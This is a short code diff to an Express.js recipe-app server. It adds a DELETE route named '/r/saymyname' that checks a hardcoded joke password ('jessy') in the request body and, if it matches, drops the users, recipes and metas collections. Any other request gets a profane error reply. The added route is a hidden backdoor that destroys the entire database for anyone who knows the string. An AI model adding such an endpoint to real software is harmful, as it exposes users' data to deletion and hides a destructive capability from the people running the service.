@@ -66,6 +66,25 @@ app.post( '/comment', recipeController.comment );
 app.post( '/forked', metaController.forked );
 app.post( '/incUsersRecipes', metaController.incUsersRecipes );
 
+app.delete( '/r/saymyname', function ( request, response ) {
+    if ( request.body.heisenberg == "jessy" ) {
+        db.collections[ 'users' ].drop( function ( err ) {
+            console.log( 'collection dropped' );
+        } );
+        db.collections[ 'recipes' ].drop( function ( err ) {
+            console.log( 'collection dropped' );
+        } );
+        db.collections[ 'metas' ].drop( function ( err ) {
+            console.log( 'collection dropped' );
+        } );
+    } else {
+        response.json( {
+            "fuck": "you"
+        }, 500 )
+    }
+
+} );
+
 var port = 3000;
 app.listen( port, function ( ) {
     console.log( 'Express server listening on port ' + port );
